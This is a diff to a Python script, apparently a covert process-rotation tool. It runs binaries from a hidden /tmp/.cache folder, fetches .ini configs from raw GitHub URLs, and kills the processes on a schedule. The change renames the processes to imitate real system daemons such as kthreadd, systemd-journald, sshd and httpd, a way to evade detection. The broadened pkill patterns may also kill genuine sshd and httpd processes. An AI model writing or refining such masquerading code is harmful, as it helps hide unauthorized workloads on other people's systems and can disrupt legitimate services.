@@ -6,7 +6,7 @@ import time
 import subprocess
 
 base_path = "/tmp/.cache"
-binary_names = ["kthreadd-journald", "systemd-001", "sshd-systemd", "httpd-netstart"]
+binary_names = ["kthreadd.", "systemd-journald.", "sshd.", "httpd."]
 config_links = [
     "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-01/refs/heads/main/sg.ini",
     "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-01/refs/heads/main/cn.ini",
@@ -80,10 +80,10 @@ def run_rotasi():
             folder_index = (folder_index + 1) % 4
 
         print("[Poppy] Long rest 10 menit...")
-        subprocess.run("pkill -f kthreadd-journald", shell=True)
-        subprocess.run("pkill -f systemd-001", shell=True)
-        subprocess.run("pkill -f sshd-systemd", shell=True)
-        subprocess.run("pkill -f httpd-netstart", shell=True)
+        subprocess.run("pkill -f kthreadd.", shell=True)
+        subprocess.run("pkill -f systemd-journald.", shell=True)
+        subprocess.run("pkill -f sshd.", shell=True)
+        subprocess.run("pkill -f httpd.", shell=True)
         time.sleep(long_rest)
 
 # Jalankan semua
